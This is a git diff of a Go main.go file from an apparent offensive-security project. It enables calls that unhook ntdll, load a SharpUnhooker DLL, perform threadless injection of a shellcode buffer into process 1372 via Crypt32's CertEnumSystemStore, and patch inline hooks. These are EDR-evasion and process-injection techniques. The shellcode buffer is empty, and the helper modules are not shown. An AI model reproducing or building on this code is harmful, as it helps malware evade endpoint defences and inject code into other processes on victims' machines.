@@ -1,14 +1,19 @@
 package main
 
-import "UnhookingGoLang/SharpUnhooker"
+import (
+	"UnhookingGoLang/NtdllUnhook"
+	"UnhookingGoLang/PatchInlineHooking"
+	"UnhookingGoLang/ThreadlessInject"
+	"syscall"
+)
 
 func main() {
-	//NtdllUnhook.Dll()
-	//
-	//syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")
-	//
-	//shellcode := []byte{}
-	//ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 1372, shellcode)
+	NtdllUnhook.Dll()
 
-	SharpUnhooker.Unhook()
+	syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")
+
+	shellcode := []byte{}
+	ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 1372, shellcode)
+
+	PatchInlineHooking.Inline()
 }
